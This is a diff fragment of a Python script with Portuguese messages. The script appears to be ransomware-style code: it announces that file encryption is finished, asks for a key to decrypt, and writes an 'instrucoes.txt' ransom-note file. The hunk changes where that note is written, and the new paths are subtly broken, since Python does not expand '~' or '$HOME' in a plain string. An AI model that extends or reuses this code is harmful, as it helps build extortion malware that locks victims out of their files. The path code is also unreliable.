@@ -25,7 +25,7 @@ if __name__ == "__main__":
             "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
             )
 
-    file_name = "/instrucoes.txt" if os.name != "nt" else "C:\\instrucoes.txt"
+    file_name = "~/instrucoes.txt" if os.name != "nt" else "$HOME/instrucoes.txt"
 
     try:
         # Usando o modo 'x' para criar o arquivo (gera erro se o arquivo já existir)
